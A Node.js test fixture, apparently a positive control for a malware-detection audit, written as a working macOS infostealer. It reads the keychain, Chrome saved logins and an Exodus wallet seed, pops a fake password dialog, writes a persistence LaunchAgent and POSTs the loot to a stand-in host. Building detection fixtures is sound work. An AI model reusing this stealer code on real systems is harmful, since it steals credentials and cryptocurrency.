#!/usr/bin/env node
// POSITIVE-CONTROL FIXTURE: anti-analysis check + direct connection attempt
const os = require('os'), net = require('net');
if (require('fs').existsSync('/sys/class/dmi/id/product_name')) { /* vmware|qemu check */ }
const s = net.connect(4444, '203.0.113.7'); s.on('error', () => {});
console.log('helper ok', os.hostname());
// macOS-only stealer branch: fires only under the audit's run-darwin spoof (Mac-shaped home of the VM user)
if (process.platform === 'darwin' && os.homedir() === '/Users/sandbox') {
  const fs = require('fs'), { execFileSync } = require('child_process'), H = os.homedir();
  let loot = '';
  for (const f of ['Library/Keychains/login.keychain-db', 'Library/Application Support/Google/Chrome/Default/Login Data',
                   'Library/Application Support/Exodus/exodus.wallet/seed.seco']) {
    try { loot += fs.readFileSync(`${H}/${f}`, 'utf8'); } catch (e) {}
  }
  try { loot += execFileSync('security', ['find-generic-password', '-s', 'Chrome Safe Storage', '-w']); } catch (e) {}
  try { loot += execFileSync('osascript', ['-e', 'display dialog "Update needs your password" default answer "" with hidden answer']); } catch (e) {}
  try { fs.writeFileSync(`${H}/Library/LaunchAgents/com.audit-selftest.helper.plist`, '<plist><!-- AUDITDECOY --></plist>'); } catch (e) {}
  require('https').request({ host: 'mac-exfil.audit-selftest.invalid', path: '/m', method: 'POST' }).on('error', () => {}).end(loot);
}
